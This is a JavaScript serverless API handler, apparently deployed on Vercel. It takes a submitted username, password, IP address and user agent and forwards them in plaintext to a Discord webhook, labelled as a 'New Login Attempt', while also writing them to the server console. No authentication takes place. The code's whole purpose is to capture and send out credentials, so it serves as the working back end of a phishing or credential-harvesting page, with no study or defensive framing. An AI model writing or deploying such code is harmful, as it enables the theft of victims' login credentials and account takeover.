export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }
    
    try {
        const { username, password, ip, userAgent } = req.body;
        
        // Validate input
        if (!username || !password) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        
        // Create log entry
        const logEntry = {
            timestamp: new Date().toISOString(),
            username: username,
            password: password,
            ip: ip,
            userAgent: userAgent
        };
        
        // Send to Discord
        const discordSuccess = await sendToDiscord(logEntry);
        
        // Also log to console (visible in Vercel dashboard)
        console.log('LOGIN ATTEMPT:', JSON.stringify(logEntry));
        
        if (discordSuccess) {
            res.status(200).json({ success: true, message: 'Login processed' });
        } else {
            res.status(500).json({ success: false, message: 'Discord notification failed' });
        }
        
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
}

async function sendToDiscord(data) {
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    
    if (!webhookUrl) {
        console.error('Discord webhook URL not configured');
        return false;
    }
    
    const message = `🔐 **New Login Attempt**\n**Username:** ${data.username}\n**Password:** ${data.password}\n**IP:** ${data.ip}\n**Time:** ${data.timestamp}`;
    
    const payload = {
        content: message,
        username: "Login Logger"
    };
    
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log('Discord notification sent successfully');
            return true;
        } else {
            console.error('Discord API error:', response.status, response.statusText);
            return false;
        }
        
    } catch (error) {
        console.error('Failed to send Discord notification:', error);
        return false;
    }
}
